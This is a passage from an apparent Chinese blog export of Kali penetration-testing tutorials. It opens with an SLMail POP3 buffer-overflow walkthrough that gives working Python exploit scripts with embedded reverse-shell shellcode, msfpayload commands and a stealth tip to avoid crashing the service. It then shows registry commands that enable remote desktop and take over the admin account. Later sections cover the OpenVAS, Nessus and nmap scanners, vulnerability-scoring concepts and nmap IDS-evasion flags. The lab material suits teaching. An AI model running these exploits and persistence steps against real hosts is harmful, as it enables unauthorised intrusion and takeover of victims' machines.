LPORT&#x3D;4444 -a x86 --platform Windows -b &#39;\\x00\\x0a\\x0d&#39; -f C\n\n\n17、写入shellcode#!/usr/bin/python\nimport socket\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nshellcode = (\n\"\\xda\\xd2\\xbd\\x8d\\xdf\\xf7\\x6c\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\"+\n\"\\xb1\\x59\\x31\\x68\\x19\\x83\\xc0\\x04\\x03\\x68\\x15\\x6f\\x2a\\x0b\"+\n\"\\x84\\xe0\\xd5\\xf4\\x55\\x9e\\xe4\\x26\\x31\\xd5\\x55\\xf7\\x33\\x0c\"+\n\"\\xd2\\xa5\\x4f\\x45\\xb7\\x5d\\xdb\\x2b\\x10\\x51\\x6c\\x81\\x46\\x5c\"+\n\"\\x6d\\x24\\x47\\x32\\xad\\x27\\x3b\\x49\\xe2\\x87\\x02\\x82\\xf7\\xc6\"+\n\"\\x43\\x54\\x7d\\x27\\x19\\x30\\xf6\\xe5\\x8e\\x35\\x4a\\x35\\xae\\x99\"+\n\"\\xc0\\x05\\xc8\\x9c\\x17\\xf1\\x64\\x9e\\x47\\xa9\\xff\\xf8\\x47\\xc2\"+\n\"\\x48\\xe1\\x86\\x07\\xcd\\xd8\\xfd\\x9b\\xff\\x25\\xb4\\x68\\xcb\\x52\"+\n\"\\x46\\xb8\\x05\\xa5\\xe5\\x85\\xa9\\x28\\xf7\\xc2\\x0e\\xd3\\x82\\x38\"+\n\"\\x6d\\x6e\\x95\\xfb\\x0f\\xb4\\x10\\x1b\\xb7\\x3f\\x82\\xff\\x49\\x93\"+\n\"\\x55\\x74\\x45\\x58\\x11\\xd2\\x4a\\x5f\\xf6\\x69\\x76\\xd4\\xf9\\xbd\"+\n\"\\xfe\\xae\\xdd\\x19\\x5a\\x74\\x7f\\x38\\x06\\xdb\\x80\\x5a\\xee\\x84\"+\n\"\\x24\\x11\\x1d\\xd2\\x59\\xda\\xdd\\xdb\\x07\\x4c\\x11\\x16\\xb8\\x8c\"+\n\"\\x3d\\x21\\xcb\\xbe\\xe2\\x99\\x43\\xf2\\x6b\\x04\\x93\\x83\\x7c\\xb7\"+\n\"\\x4b\\x2b\\xec\\x49\\x6c\\x4b\\x24\\x8e\\x38\\x1b\\x5e\\x27\\x41\\xf0\"+\n\"\\x9e\\xc8\\x94\\x6c\\x95\\x5e\\xd7\\xd8\\x71\\x35\\xbf\\x1a\\x82\\x5b\"+\n\"\\x1c\\x93\\x64\\x0b\\xcc\\xf3\\x38\\xec\\xbc\\xb3\\xe8\\x84\\xd6\\x3c\"+\n\"\\xd6\\xb5\\xd8\\x97\\x7f\\x5f\\x37\\x41\\xd7\\xc8\\xae\\xc8\\xa3\\x69\"+\n\"\\x2e\\xc7\\xc9\\xaa\\xa4\\xed\\x2e\\x64\\x4d\\x84\\x3c\\x91\\x2a\\x66\"+\n\"\\xbd\\x62\\xdf\\x66\\xd7\\x66\\x49\\x31\\x4f\\x65\\xac\\x75\\xd0\\x96\"+\n\"\\x9b\\x06\\x17\\x68\\x5a\\x3e\\x63\\x5f\\xc8\\x7e\\x1b\\xa0\\x1c\\x7e\"+\n\"\\xdb\\xf6\\x76\\x7e\\xb3\\xae\\x22\\x2d\\xa6\\xb0\\xfe\\x42\\x7b\\x25\"+\n\"\\x01\\x32\\x2f\\xee\\x69\\xb8\\x16\\xd8\\x35\\x43\\x7d\\x5a\\x31\\xbb\"+\n\"\\x03\\x75\\x9a\\xd3\\xfb\\xc5\\x1a\\x23\\x96\\xc5\\x4a\\x4b\\x6d\\xe9\"+\n\"\\x65\\xbb\\x8e\\x20\\x2e\\xd3\\x05\\xa5\\x9c\\x42\\x19\\xec\\x41\\xda\"+\n\"\\x1a\\x03\\x5a\\xed\\x61\\x6c\\x5d\\x0e\\x96\\x64\\x3a\\x0f\\x96\\x88\"+\n\"\\x3c\\x2c\\x40\\xb1\\x4a\\x73\\x50\\x86\\x45\\xc6\\xf5\\xaf\\xcf\\x28\"+\n\"\\xa9\\xb0\\xc5\") \n\nbuffer = 'A' * 2606 + \"\\xe3\\x41\\x4b\\x5f\" + \"\\x90\" * 8 + shellcode \ntry:\n    print(\"\\nSending evil buffer...\")\n    s.connect(('192.168.216.172',110))\n    data = s.recv(1024)\n    s.send('USER test'+'\\r\\n')\n    data = s.recv(1024)\n    s.send('PASS '+buffer+'\\r\\n')\n    print(\"\\nDone!\")\nexcept:\n    print(\"Could not connect to POP3\")\n    \n'''\n跳转地址后，在ESP寄存器中先添加了8个\\x90(hex)，\\x90在汇编中表示nop表示不操作，这是为了shellcode运行的有效性，如果不加，在EIP跳转过来紧接着执行shellcode，在CPU进行解析时可能导致前几个字节被覆盖，为了避免异常情况的产生，所以加上一段nop，shellcode就会被连续被执行。\n'''\n\n18、Getshell本地监听4444端口\n\n执行写入shellcode的脚本\n\n\n\n\n\n\n\n\n\n\n写入shellcode后能够连接到，但是没有反弹shell；检查windowsXP发现每次监听端口时候服务就会停止，看了几篇帖子，应该是新版本msf生成的shellcode出现了问题，可能生成的shellcode字节太大了，并且新版本的msf不支持./msfpayload win32_reverse LHOST=192.168.216.173 LPORT=4444 R | ./msfencode -b &quot;\\x00\\x0a\\x0d&quot;；换了一个低版本的msf。\n19、重新生成shellcode.&#x2F;msfpayload win32_reverse LHOST&#x3D;192.168.216.172 LPORT&#x3D;4444 R | .&#x2F;msfencode -b &quot;\\x00\\x0a\\x0d&quot;\n\n\n20、Getshell#!/usr/bin/python\nimport socket\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nshellcode = (\n\"\\x6a\\x48\\x59\\xd9\\xee\\xd9\\x74\\x24\\xf4\\x5b\\x81\\x73\\x13\\xcb\\x66\\x91\"+\n\"\\x82\\x83\\xeb\\xfc\\xe2\\xf4\\x37\\x0c\\x7a\\xcf\\x23\\x9f\\x6e\\x7d\\x34\\x06\"+\n\"\\x1a\\xee\\xef\\x42\\x1a\\xc7\\xf7\\xed\\xed\\x87\\xb3\\x67\\x7e\\x09\\x84\\x7e\"+\n\"\\x1a\\xdd\\xeb\\x67\\x7a\\xcb\\x40\\x52\\x1a\\x83\\x25\\x57\\x51\\x1b\\x67\\xe2\"+\n\"\\x51\\xf6\\xcc\\xa7\\x5b\\x8f\\xca\\xa4\\x7a\\x76\\xf0\\x32\\xb5\\xaa\\xbe\\x83\"+\n\"\\x1a\\xdd\\xef\\x67\\x7a\\xe4\\x40\\x6a\\xda\\x09\\x94\\x7a\\x90\\x69\\xc8\\x4a\"+\n\"\\x1a\\x0b\\xa7\\x42\\x8d\\xe3\\x08\\x57\\x4a\\xe6\\x40\\x25\\xa1\\x09\\x8b\\x6a\"+\n\"\\x1a\\xf2\\xd7\\xcb\\x1a\\xc2\\xc3\\x38\\xf9\\x0c\\x85\\x68\\x7d\\xd2\\x34\\xb0\"+\n\"\\xf7\\xd1\\xad\\x0e\\xa2\\xb0\\xa3\\x11\\xe2\\xb0\\x94\\x32\\x6e\\x52\\xa3\\xad\"+\n\"\\x7c\\x7e\\xf0\\x36\\x6e\\x54\\x94\\xef\\x74\\xe4\\x4a\\x8b\\x99\\x80\\x9e\\x0c\"+\n\"\\x93\\x7d\\x1b\\x0e\\x48\\x8b\\x3e\\xcb\\xc6\\x7d\\x1d\\x35\\xc2\\xd1\\x98\\x25\"+\n\"\\xc2\\xc1\\x98\\x99\\x41\\xea\\x0b\\xce\\x49\\x2f\\xad\\x0e\\x80\\xde\\xad\\x35\"+\n\"\\x18\\x63\\x5e\\x0e\\x7d\\x7b\\x61\\x06\\xc6\\x7d\\x1d\\x0c\\x81\\xd3\\x9e\\x99\"+\n\"\\x41\\xe4\\xa1\\x02\\xf7\\xea\\xa8\\x0b\\xfb\\xd2\\x92\\x4f\\x5d\\x0b\\x2c\\x0c\"+\n\"\\xd5\\x0b\\x29\\x57\\x51\\x71\\x61\\xf3\\x18\\x7f\\x35\\x24\\xbc\\x7c\\x89\\x4a\"+\n\"\\x1c\\xf8\\xf3\\xcd\\x3a\\x29\\xa3\\x14\\x6f\\x31\\xdd\\x99\\xe4\\xaa\\x34\\xb0\"+\n\"\\xca\\xd5\\x99\\x37\\xc0\\xd3\\xa1\\x67\\xc0\\xd3\\x9e\\x37\\x6e\\x52\\xa3\\xcb\"+\n\"\\x48\\x87\\x05\\x35\\x6e\\x54\\xa1\\x99\\x6e\\xb5\\x34\\xb6\\xf9\\x65\\xb2\\xa0\"+\n\"\\xe8\\x7d\\xbe\\x62\\x6e\\x54\\x34\\x11\\x6d\\x7d\\x1b\\x0e\\x61\\x08\\xcf\\x39\"+\n\"\\xc2\\x7d\\x1d\\x99\\x41\\x82\") \n\nbuffer = 'A' * 2606 + \"\\xe3\\x41\\x4b\\x5f\" + \"\\x90\" * 8 + shellcode \ntry:\n    print(\"\\nSending evil buffer...\")\n    s.connect(('192.168.216.172',110))\n    data = s.recv(1024)\n    s.send('USER test'+'\\r\\n')\n    data = s.recv(1024)\n    s.send('PASS '+buffer+'\\r\\n')\n    print(\"\\nDone!\")\nexcept:\n    print(\"Could not connect to POP3\")\n\n监听端口\n\n执行脚本\n\nGetshell成功\n\n\n\n\n\n\n\n\n\n\n更低版本的MSF生成的shellcode执行结束会以exitprocess方式退出整个进程，将导致邮件服务奔溃，会引起管理员注意；由于Slmail是一个基于线程的应用，可用ExitThread方式可以避免整个服务崩溃，可实现重复溢出。\n执行以下命令即可：\n.&#x2F;msfpayload win32_reverse LHOST&#x3D;10.10.10.171 EXITFUNC&#x3D;thread LPORT&#x3D;444 R | .&#x2F;msfencode -b &quot;\\x00\\x0a\\x0d&quot;\n21、拿到GUI界面现在是命令行的方式控制目标机器，可以通过命令行打开目标机器的远程桌面，得到图形化的方式控制目标机器；\n执行以下的一系列命令达到修改注册表的键值打开远程桌面服务：\necho Windows Registry Editor Version 5.00&gt;3389.reg\n\necho [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server]&gt;&gt;3389.reg\n\necho &quot;fDenyTSConnections&quot;&#x3D;dword:00000000&gt;&gt;3389.reg\n\necho [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp]&gt;&gt;3389.reg\n\necho &quot;PortNumber&quot;&#x3D;dword:00000d3d&gt;&gt;3389.reg\n\necho [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp]&gt;&gt;3389.reg\n\necho &quot;PortNumber&quot;&#x3D;dword:00000d3d&gt;&gt;3389.reg\n\nregedit &#x2F;s 3389.reg\n\n\n查看目录已经存在3389.reg文件\n\n此时的远程桌面是没有开启的\n\n重启服务器\n\n远程桌面服务器已经开启\n\n22、安装远程桌面服务rdesktop是Linux系统连接windows远程桌面的客户端程序\n\n\n登录管理员帐户\n\n23、修改管理员密码拿到一台服务器权限时候有时候是不知道管理员密码的，这时候可以修改管理员密码\n\n远程登录\n\n\n\n\n\n\n\n\n\n\n\n成功拿下主机。\n\n\n\n\n\n\n\n\n\nwindows主机的每一步配置都会写在注册表里，拿下权限之后通过修改注册表的键值来达到控制主机的目的。可以使用RegSnap这个软件来比较注册表发生变化的前后键值，就能够清楚那些键值被改变。\n","slug":"Kali渗透测试-缓冲区溢出【Windows】","date":"2022-12-19T09:20:03.000Z","categories_index":"缓冲区溢出","tags_index":"Kali,缓冲区溢出","author_index":"Aurora"},{"id":"48f34670bb7ad122042ed7d59939a5da","title":"Kali渗透测试-漏洞扫描工具","content":"Nmap Script\nnmap漏洞扫描脚本路径\n&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts &#x2F;scripts.db\n\n\n\n漏洞利用脚本\nless script.db | grep vuln | wc -l\n\n\n\n\n\n\n\n\nSmb-vuln-ms10-061.nse\n\n\n\n\n\n\n\n\n\nSmb-vuln-ms10-061.nse\nStuxnet蠕虫利用的4个漏洞之一\nStuxnet：震网病毒\n\n\nPrint Spooler服务权限不当，打印机请求可在系统目录可创建文件、可执行任意代码\n通过LANMAN API枚举共享打印机\n远程共享打印机名称\nsmb-enum-shares枚举共享\n身份认证参数—smbuser、smbpassword\nnmap -p445 –script&#x3D;smb-enum-shares.nse –script-args&#x3D;smbuser&#x3D;admin,smbpassword&#x3D;pass 1.1.1.1\n\n\nWindows XP,Server 2003 SP2,Vista,Server 2008,win7\n\n\n影响扫描结果的因素\n若没有使用smb-enum-shares脚本探测共享打印机名称，只是通过ms10-061脚本默认的LANMAN API查询，若目标系统没有开启LANMAN API，脚本就会直接判断目标系统不存在这个漏洞；其他扫描器可能通过帐号密码登录到目标系统通过查询有没有打ms10-061的补丁去判断是否存在这个漏洞，若没有打这个补丁，但没有开启共享打印机，漏洞就不会被利用\n\n\n原理\nms10-061脚本先探测目标系统是否存在共享打印机，之后通过LANMAN探测目标系统共享打印机名称，直接进行攻击性的探测；若目标系统没有开放LANMAN API，探测不到共享打印机，nmap使用枚举共享的脚本smb-enum-shares.nse探测共享打印机，再利用ms10-061去探测是否可以在系统目录可创建文件、可执行任意代码\n\n\n\n\n使用Smb-vuln-ms10-061.nse脚本的LANMAN API没有发现共享打印机，可以使用枚举脚本\nnmap -p445 –script&#x3D;smb-enum-shares.nse 192.18.216.167\n\n\n\n\n\n\n\n\n\n\n\n\n如果已知目标主机帐号密码可以使用脚本参数--script-args=smbuser=admin,smbpassword=pass登录查看是否开启共享打印机；若未知帐号密码直接使用枚举脚本即可。\n\n\n\n\n\n\nOPENVAS\n\n\n\n\n\n\n\n\n\nOpenvas\nNessus项目分支\n管理目标系统的漏洞\n免费开源\nKali默认安装，但未配置和启动\n\n\nOpenVAS介绍\n是开放式漏洞评估系统，也可以说它是一个包含着相关工具的网络扫描器。其核心部件是一个服务器，包括一套网络漏洞测试程序，可以检测远程系统和应用程序中的安全问题。\n\n\nOpenvas架构\nOpenVAS是一个客户端&#x2F;服务器架构，它由几个组件组成。在服务器上（仅限于Linux），用户需要四个程序包：\nOpenVAS-Server: 实现基本的扫描功能\nOpenVAS-Plugins: 一套网络漏洞测试程序\nOpenVAS-LibNASL 和OpenVAS-Libraries: 实现服务器功能所需要的组件\n而在客户端上（Windows或Linux均可），用户仅需要OpenVAS客户端。\n\n\n\n\n官网\nhttps://www.openvas.org/\nOpenVAS从10版本后改名GVM\n\n\n\nOPENVAS架构\n\n\n\n\n\n\n\n\n\n\nOpenVAS Manager\n控制scanner和其他manager的中心组件\n控制中心数据库，保存用户配置及扫描结果\n客户端使用基于XML的无状态OMP协议与其通信\n集中排序筛选，使客户端获得一致展现&#x2F;olos.odn\n\n\nOpenVAS Scanner\n具体执行Network Vulnerability Tests (NVTS)\nNVTs 每天通过Feed 更新\n受 Manager 控制\n\n\nOSP Scanner\n可以统一管理多个scanner\n将一组 scanner 作为一个对象交给manager管理\n\n\nGreenbone Security Assistant (GSA)\n提供Web servise\n\n\nOpenVAS CLI\nomp命令行工具，可实现批处理控制manager\n\n\n更新更快\n所有找得到的资料几乎都已不同程度的过时了\n\n\n\n配置Openvas\n安装GVM\n\napt-get install gvm -y\n\ngvm-setup\n\n\n\n\n\n\n\n\n\n\n\n\n出现报错，查看一下报错信息\n\npg_lsclusters\n\n\n\n\n\n\n\n\n\n\n\n\nGVM启动时postgresql默认使用端口5432\n\n修改端口\n\n\nmousepad /etc/postgresql/13/main/postgresql.conf   # 将13的端口修改为5433mousepad /etc/postgresql/15/main/postgresql.conf   # 将15的端口修改为5432\n\n重启pgsql服务：systemctl restart postgresql\n\n\n\n重新运行gvm-setup\n\n\n\n\n\n\n\ngvm-check-setup\n\n\n出现报错\n\n使用chmod 666 /var/log/gvm/openvas.log修改日志文件权限，再次验证\n\n\n\n\n配置外部监听\n\n\n\n\n基本命令\n\ngvm-start    #启动openvasgvm-stop     #停止openvas     gvm-check-setup  #升级特征库  第一次安装，不用升级。后期使用记得经常升级特征库。\n\n\n基本配置\n\nsudo runuser -u _gvm -- gvmd --user=admin --new-password=password  #修改密码sudo runuser -u _gvm -- gvmd --create-user=admin2 --new-password=123456  #创建新的管理员\n\n配置文件路径\n\n/lib/systemd/system/greenbone-security-assistant.service\n\n\n\n\nhttps://127.0.0.1:9392\n\n\n\n\n\nOPENVAS使用Scans1、向导\n\nTask Wizard\n\n\n\n\n\n\n\n\n\n\n\n\nTask Wizard    \t\t\t\t 任务向导（默认向导）\nAdvanced Task Wizard   高级任务向导\nModify Task Wizard        自定义任务向导\n\n\n任务向导（默认向导：使最少的用户输入自己的配置并启动基本扫描）\n\n\n\n\n\n\n\n\n\n\n在输入框中输入目标系统的IP地址或主机名\n点击Start Scan ：\n→ 任务向导自动执行以下步骤：\n\n在设备上创建新的扫描目标。\n在设备上创建新的扫描任务。\n立即启动扫描任务。\n显示页面任务 .\n\n\n\n\n\n\n\n\n\n\n\n\n\n任务启动后，可以查看进度\n\n\n\n\n\n高级任务向导\n\n\n\n\n\n\n\n\n\n\n除了简单向导之外，该设备还提供了一个高级向导，允许使用更多配置选项。\n\n\n\n\n\n向导修改任务（其他向导可以修改现有任务）\n\n\n\n\n\n\n创建任务并配置\n\n\n\n\n\n\n2、Reports\n\n\n\n\n\n\n\n\n\n扫描结果报告\n\n3、Results\n\n\n\n\n\n\n\n\n\n扫描结果\n\n4、Vulnerabilities\n\n\n\n\n\n\n\n\n\n漏洞列表\n\nConfiguration\n\n\n\n\n\n\n\n\n配置一栏主要是Scan Configs需要详细了解\nScan Configs\n\n\n新建扫描配置\n\n\n\n\n\n\n\n\n\n可以选择Openvas给定的三种扫描方式\n\n\n\n\n编辑新建的扫描配置\n\n\n\n\n\n\n\n\n\n可以自定义NVTs，选择对应的NVTs进行扫描；例如：扫描windowsOS可以只选择windows类型的NVTs；扫描LinuxOS选择Linux类型的NVTs。\n\n\n\n\n\n\n\n\n\n\n\n\n其中Trend一栏：\n↗表示编辑完配置文件之后自动将官方后续更新的NVT集添加到已配置完成的配置文件中；➡表示只保存当前配置的NVT集，后续官方若有新的NVT更新，则不会自动添加到已配置完成的配置文件中\n\n\n\n\n**Targets **\n\n\n\n\n\n\n\n\n\n定义好配置文件之后，就需要设置扫描目标\n\n新建扫描目标\n\n\n\n\n\nPort Lists\n\n\n\n\n\n\n\n\n\n自定义端口列表，或者使用默认端口列表\n\n注意：扫描器只是辅助作用，每个扫描使用的扫描方法可能不同，扫描出的结果未必是准确的，存在误报，漏报，渗透测试者需要自行判断出是否真的存在扫描出的漏洞\nNESSUS\n\n\n\n\n\n\n\n\n\n家庭版\n免费\n\n\n专业版\n收费，无限的并发连接\n\n\n下载\nhttps://www.tenable.com/downloads/nessus?loginAttempted=true\n\n\n\nKali-安装Nessus\n官网下载基于Debian的Nessus安装包\n\n基于deb的安装包不需要使用apt-get命令，使用dpkg\n\n\n\n\n启动Nessus\n\n&#x2F;bin&#x2F;systemctl start nessusd.service\n\n\n\n\n\n获取激活码\n\nhttps://zh-cn.tenable.com/products/nessus/nessus-essentials访问官网进行注册获取注册码\n\n\n\n\n\n激活\n\nkali中输入下面命令\n&#x2F;opt&#x2F;nessus&#x2F;sbin&#x2F;nessuscli fetch  --challenge \n\n\n\n\n\n将得到的challenge code复制粘贴到对应网址中\n\n\n\n\n\n\n\n\n\n\n\n\n第一个输入框填challenge code，第二个输入框填邮箱得到的activation code\n\n\n\n得到插件和证书下载地址\n\nhttps://plugins.nessus.org/v2/nessus.php?f=all-2.0.tar.gz&amp;u=4bd4b4a84a094d9c6d549da2e1b3fcde&amp;p=6e4b71afbd6f74e272fd54824dce5242\n\n\n\n\n\n\n\n\n将许可证和证书上传到kali，移动到Nessus目录下\n\n\n\n\n\n输入命令进行离线激活\n&#x2F;opt&#x2F;nessus&#x2F;sbin&#x2F;nessuscli fetch --register-offline .&#x2F;nessus.license\n\n\n\n\n\n\n\n\n\n\n\n\n\n出现上面的提示表示激活成功\n\n\n\n更新插件包\n&#x2F;opt&#x2F;nessus&#x2F;sbin&#x2F;nessuscli update .&#x2F;all-2.0.tar.gz\n\n\n\n\n\n重启nessus服务\n\nservice nessusd restart\n\n\n\n\n\n重新打开web页面即可\n\n\nNessus使用\n\n\n\n\n\n\n\n\nNessus主要针对于主机的扫描，对于Web应用的扫描很薄弱\n新建扫描Settings\n创建新策略\n\n选择Policies点击 scan templates填写扫描信息保存\n\n\n查看扫描状态及结果\n\n\n\n\n\n\n\n\n\n\n\n\n\n若想重新配置扫描信息可以点击右上角Configure\n\nNotifications\n\n\n\n\n\n\n\n\n\n将邮箱添加到输入框中，接收扫描结果报告\n\n\n\n\n\n\n\n\n\n\n配置SMTP Server，其中需要在邮箱中开启SMTP服务，再输入授权码才能收到邮件。\n\n\n\n\n发现\n\n\n\n\n\n\n\n\n\n\n\n发现栏中可以配置主机发现，端口扫描，服务发现以及从域服务中收集身份信息\n\n\n\n网络唤醒(Wake-on-LAN)\n\n\n\n\n\n\n\n\n\n其中主机发现当中有Wake-on-LAN选项，即使目标主机关机，可以使用Wake-on-LAN选项进行将目标主机唤醒；其中需要添加List of MAC addresses文件，Nessus会通过这些MAC地址对目标主机发送网络唤醒的指令，唤醒需要设置等待时间，等待目标主机彻底启动之后接着扫描。\n\n\n\nCredentials\n\n\n\n\n\n\n\n\nCredential一栏，若是已知目标系统的帐号密码，可以在这一栏添加目标系统的帐号密码，Nessus使用帐号密码登录到目标系统进行深度性的扫描，结果会更准确\n主机扫描\n\n数据库扫描\n\n所有能够扫描的设备\n\nPlugins\n\n\n\n\n\n\n\n\nPlugins选项，挑选需要扫描的插件进行选择，最终Save保存为新策略\n\n\n\n\n\n\n\n\n\n\n\nOpenvas是Nessus的分支，操作起来和Nessus差不多。\nNEXPOSE\n\n\n\n\n\n\n\n\n\nRapid7 Nexpose\n领先的漏洞评估工具之一\n一款面向大型网络组织的安全风险智能解决方案\n主动支持整个漏洞管理生命周期，包括发现，检测，验证，风险分类，影响分析，报告和缓解。\n需要使用企业邮箱激活\n免费试用 30天\n下载地址：https://www.rapid7.com/products/nexpose/download/\n\n\n\n","slug":"Kali渗透测试-漏洞扫描工具","date":"2022-12-15T03:01:15.000Z","categories_index":"漏洞扫描","tags_index":"Kali,漏洞扫描","author_index":"Aurora"},{"id":"fe017e4da29721d7599c38c0ffdbd9b2","title":"Kali渗透测试-漏洞扫描概念","content":"发现弱点\n\n\n\n\n\n\n\n\n\n发现漏洞\n基于端口服务扫描结果版本信息（速度慢）\n搜索已公开的漏洞数据库\nhttps://www.exploit-db.com/\n\n\n使用漏洞扫描器实现漏洞管理\n\n\n\nSearchsploit\n\n\n\n\n\n\n\n\n由于在各大网站搜索漏洞会很不方便导致花费大量的实践，可以使用集成的漏洞搜索库\n\nsearchsploit tomcat\n\n\n\n\n漏洞库目录\n\n&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;\n\n\n\n\n\n\n漏洞扫描类型\n\n\n\n\n\n\n\n\n主动扫描\n有身份验证\n无身份验证\n\n被动扫描\n镜像端口抓包\n其他来源输入\n\n基于Agent的扫描\n支持平台有限\n\n漏洞基本概念CVSS\n\n\n\n\n\n\n\n\n\nCVSS（Common Vulnerability Scoring System）\n通用漏洞评分系统—工业标准\n描述安全漏洞严重程度的统一评分方案\n目前版本V3.1\nBasic Metric：基础的恒定不变的弱点权重\nTemporal Metric：依赖时间因素的弱点权重\nEnviromental Metric：利用弱点的环境要求和实施难度的权重\n\n\n\n\n\n\n\n\n\n\n\n\n\nCVSS（Common Vulnerability Scoring System）\nCVSS是安全内容自动化协议（SCAP）的一部分\n通常CVSS与CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新\n分值范围：0—10\n不同机构按CVSS分值定义威胁的低，中，高威胁级别\nCVSS体现弱点的风险，威胁级别（severity）表示弱点风险对企业的影响程度\nCVSS分值是工业标准，但威胁级别不是\n\n\n\n\nCVE\n\n\n\n\n\n\n\n\n\nVulnerability Reference\nCVE ( Common Vulnerabilities and Exposure )\n己公开的信息安全漏洞字典，统一的漏洞编号标准\nMITRE公司负责维护（非盈利机构）\n扫描器的大部分扫描项都对应一个CVE编号\n实现不同厂商之间信息交换的统一标准\n\n\nCVE发布流程\n发现漏洞\nCAN负责指定CVE ID\n发布到CVE List—CVE-2008-4250\nMITRE负责对内容进行编辑维护\n\n\n\n很多厂商维护自己的Vulnerability Reference\n\n\n\n\n\n\n\n\n\nMS\n\n微软的漏洞一般都叫MS-xx-xx（年份+漏洞序号）\n例如：MS-08-067\n\n\nMSKB\n\n微软补丁叫KB\n一个补丁一个KB\n\n\n\n其他Vulnerability Reference\n\n\n\n\n\n\n\n\n\nCERT         TA08-297A\nBID            31874\nIAVM         2008-A-0081\nOVAL         OVAL6093\n\nSCAP框架\n\n\n\n\n\n\n\n\n\nSecurity Content Automation Protocol (SCAP)\nSCAP 是一个集合 了多种安全标准框架\n六个元素：CVE、 OVAL、 CCE、 CPE、 CVSS. XCCDF\n目的是以标准的方法展示和操作安全数据\n由NIST负责维护\n\n\nSCAP主要解决三个问题\n实现高层政策法规等到底层实施的落地 （如FISMA,1SO27000系列）\n将信息安全所涉及的各个要素标准化（如统一漏洞的命名及严重性度量）\n将复杂的系统配置核查工作自动化\n\n\nSCAP是当前美国比较成敦的一套信息安全评估标准体系，其标准化、自动化的恩想对信息安全行业产生了深远的影响。\n\nNVD\n\n\n\n\n\n\n\n\n\nNVD (National Vulnerability Database )\n美困政府的漏洞管理标准数据\n完全基于SCAP框架\n实现自动化漏河管理、安全测量、合规要求\n包含以下库\n安全检查列表\n软件安全漏洞\n配置锘误\n产品名称\n影响度量\n\n\n\n\nhttps://nvd.nist.gov/\n\n漏洞管理\n\n\n\n\n\n\n\n\n\n周期性扫描\n高危漏洞优先处理\n扫描注意事项\n漏洞管理三要素\n准确性\n时间\n资源\n\n\n\n","slug":"Kali渗透测试-漏洞扫描概念","date":"2022-12-15T01:20:08.000Z","categories_index":"漏洞扫描","tags_index":"Kali,漏洞扫描","author_index":"Aurora"},{"id":"dd3ae0f5a97a6beeb6ec96fc20e75d85","title":"Kali渗透测试-nmap专题","content":"Nmap目标发现\n\n-iL     # 从主机或者网络列表中读取数据进行扫描\n-iR     # 随机选择目标进行扫描\n\n\n\n–exclude     # 排除某个或某段地址进行扫描\n\n\n\n\n\n\n主机发现\n\n-sL    # 列出扫描的目标，相当于子网掩码的计算\n\n\n\n-sn   # 不做端口扫描\n-Pn   # 无论是否有响应包，把所有需要扫描的都扫描一遍，（穿透防火墙的扫描）\n-PS&#x2F;PA&#x2F;PU&#x2F;PY   # SYN，ACK，UDP发现；PY用于SCTP发现，不属于计网络协议\n-PE&#x2F;PP&#x2F;PM   # PE是ICMP echo；PP用于发送时间戳；PM查询子网掩码\n-PO   # IP协议的ping\n-n&#x2F;-R  #  -n不做DNS解析；-R作DNS反向解析\n–dns-servers   # 调用指定DNS服务器扫描\n–system-dns   # 进行操作系统默认的DNS扫描\n–traceroute    #  路由追踪\n\n\n\n\n\n\n端口发现\n\n-sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM   # SYN半开扫描；TCP全扫描；ACK扫描；窗口扫描；ACK+Fin组合（这几个参数都是不同的flags字段的组合）\n-sU     # UDP扫描\n\n\n\n-sN&#x2F;sF&#x2F;sX    # TCP的flags字段全NULL；只有Fin字段的扫描；Urgent字段的扫描\nnmap -sN -p80 192.168.216.167\n\n\n\nnmap -sX -p80 192.168.216.167\n\n\n\n\n\n-sI         # 僵尸扫描\n-sY&#x2F;sZ  # SCTP扫描\n-sO       # IP扫描\n-b         # FTP中继扫描\n\n\n\n指定端口扫描\n\n-p不指定U或者T进行全扫描，也可指定U:53或者T:21进行扫描\n\n\n\n\n–exclude-ports    # 排除某些端口进行扫描\n-F     # 快速扫描；扫描一些少的常用端口\n-r      # 顺序扫描，按照端口顺序进行扫描；否则随机扫描\n–top-ports    # 扫描默认1000个端口的排名靠前的端口\n\n\n\n–port-ratio     # 扫描更常用的端口\n\n\n\n服务扫描\n\n-sV   # 服务扫描，不是所有特征库进行匹配扫描\n–version-intensity      # 强度扫描0-9；从低到高，强度逐渐增加\n\n\n\n–version-light      # 强度为2的扫描\n-version-all           # 强度为9的扫描\n–version-trace     # 显示详细的扫描过程\n\n\n\nScript扫描\n\n–script&#x3D;   # 指定脚本扫描\n–script-args&#x3D;&lt;n1&#x3D;v1,……&gt;   #  指定脚本参数\n–script-trace             # 显示脚本扫描详细信息\n–script-updatedb    # 更新脚本库\n–script-help&#x3D;    # 查看脚本使用方法\n\n\n\nOS检测\n\n-O  # OS检测\n–scscan-limit   #  限制OS检测，只检测windows或者只检测linux\n\n\n\n时间和性能\n\n\n\n\n\n\n\n\n进行防止被发现的时间或者性能参数\n\n\n-T # 设置扫描速度，一般T4足够\n–min-hostgroup&#x2F;max-hostgroup    # 设置一组最小&#x2F;最大扫描多少主机\n–min-parallelism&#x2F;max-parallelism  # 设置并行的最小&#x2F;最大的扫描\n–scan-delay   #  每次探测延迟时间\n–min-rate      #  每秒发包最小是多少\n–max-rate     #  每秒发包最大是多少\n\n\n\nFIREWALL&#x2F;IDS的躲避或欺骗\n\n\n-f; –mtu       #  设置最大传输单元\n\n-D    # 噪声地址隐藏源地址\n\n\n\n\n\n-S    # 欺骗源地址，使用时需要-e参数指定网卡，再加上-Pn进行扫描\n\n\n\n\n-e    # 指定网卡\n\n-g    # 指定源端口\n\n\n\n\n–proxies   # 指定代理服务器扫描\n\n–data    # 发送包中加入data字段（hex）\n\n\n\n\n\n\n\n–ip-options  # 可选字段，加入特定的IP选项\n\n–ttl   # 手动设定TTL值\n\n–spoof-mac   # 欺骗MAC地址\n\n\n\n\n\n–badsum    # 